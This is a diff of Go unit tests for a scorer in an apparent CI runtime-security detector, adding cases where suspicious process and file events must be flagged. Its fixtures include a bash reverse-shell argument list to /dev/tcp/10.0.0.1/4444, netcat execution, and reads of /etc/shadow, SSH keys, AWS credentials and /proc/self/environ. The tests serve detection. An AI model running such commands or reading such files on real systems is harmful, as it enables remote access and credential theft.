@@ -10,20 +10,78 @@ import (
 	"github.com/IgorEulalio/philip/backend/baseline"
 )
 
-func TestScorer_ScoreJob_LearningMode(t *testing.T) {
+func TestScorer_ScoreJob_LearningMode_BenignEvent(t *testing.T) {
 	scorer := NewScorer(slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError})))
 
 	bl := &baseline.RepositoryBaseline{
 		Status: "learning",
 	}
 
+	// Normal binary should not trigger static detection
 	events := []sensor.Event{
 		{Type: sensor.EventTypeProcessExec, Binary: "/usr/bin/curl"},
 	}
 
 	deviations := scorer.ScoreJob(bl, events)
 	if len(deviations) != 0 {
-		t.Errorf("expected no deviations during learning mode, got %d", len(deviations))
+		t.Errorf("expected no deviations for benign binary during learning, got %d", len(deviations))
+	}
+}
+
+func TestScorer_ScoreJob_LearningMode_StaticDetection(t *testing.T) {
+	scorer := NewScorer(slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError})))
+
+	bl := &baseline.RepositoryBaseline{
+		Status: "learning",
+	}
+
+	tests := []struct {
+		name  string
+		event sensor.Event
+	}{
+		{
+			name:  "suspicious binary nc",
+			event: sensor.Event{Type: sensor.EventTypeProcessExec, Binary: "/usr/bin/nc"},
+		},
+		{
+			name: "suspicious args reverse shell",
+			event: sensor.Event{
+				Type:   sensor.EventTypeProcessExec,
+				Binary: "/bin/bash",
+				Args:   []string{"-i", ">&", "/dev/tcp/10.0.0.1/4444"},
+			},
+		},
+		{
+			name: "sensitive path access",
+			event: sensor.Event{
+				Type:       sensor.EventTypeFileAccess,
+				Binary:     "/usr/bin/cat",
+				FilePath:   "/etc/shadow",
+				AccessType: "read",
+			},
+		},
+		{
+			name: "high-risk parent combo",
+			event: sensor.Event{
+				Type:         sensor.EventTypeProcessExec,
+				Binary:       "/usr/bin/nc",
+				ParentBinary: "/usr/bin/node",
+			},
+		},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			deviations := scorer.ScoreJob(bl, []sensor.Event{tc.event})
+			if len(deviations) == 0 {
+				t.Error("expected static detection during learning mode, got 0 deviations")
+			}
+			for _, d := range deviations {
+				if !d.StaticOnly {
+					t.Error("expected StaticOnly=true for learning mode detection")
+				}
+			}
+		})
 	}
 }
 
@@ -241,7 +299,7 @@ func TestScorer_ScoreFileAccess(t *testing.T) {
 				FilePath:   "/etc/shadow",
 				AccessType: "read",
 			},
-			wantDeviations: 1,
+			wantDeviations: 2, // sensitive_path + new_file
 		},
 		{
 			name: "sensitive path ssh key",
@@ -251,7 +309,7 @@ func TestScorer_ScoreFileAccess(t *testing.T) {
 				FilePath:   "/home/runner/.ssh/id_rsa",
 				AccessType: "read",
 			},
-			wantDeviations: 1,
+			wantDeviations: 1, // sensitive_path only (path pattern /home/runner/** is in baseline)
 		},
 		{
 			name: "sensitive path aws credentials",
@@ -261,7 +319,7 @@ func TestScorer_ScoreFileAccess(t *testing.T) {
 				FilePath:   "/home/runner/.aws/credentials",
 				AccessType: "read",
 			},
-			wantDeviations: 1,
+			wantDeviations: 1, // sensitive_path only (path pattern /home/runner/** is in baseline)
 		},
 		{
 			name: "sensitive path proc environ",
@@ -271,10 +329,10 @@ func TestScorer_ScoreFileAccess(t *testing.T) {
 				FilePath:   "/proc/self/environ",
 				AccessType: "read",
 			},
-			wantDeviations: 1,
+			wantDeviations: 2, // sensitive_path + new_file
 		},
 		{
-			name: "non-sensitive path no deviation",
+			name: "known path pattern no deviation",
 			event: sensor.Event{
 				Type:       sensor.EventTypeFileAccess,
 				Binary:     "/usr/bin/cat",
@@ -285,7 +343,16 @@ func TestScorer_ScoreFileAccess(t *testing.T) {
 		},
 	}
 
-	bl := &baseline.RepositoryBaseline{Status: "active"}
+	bl := &baseline.RepositoryBaseline{
+		Status: "active",
+		FileAccessProfiles: []baseline.FileAccessProfile{
+			{
+				PathPattern: "/home/runner/**",
+				AccessTypes: []string{"read", "write"},
+				BinaryPaths: []string{"/usr/bin/cat", "/usr/bin/gcc"},
+			},
+		},
+	}
 
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
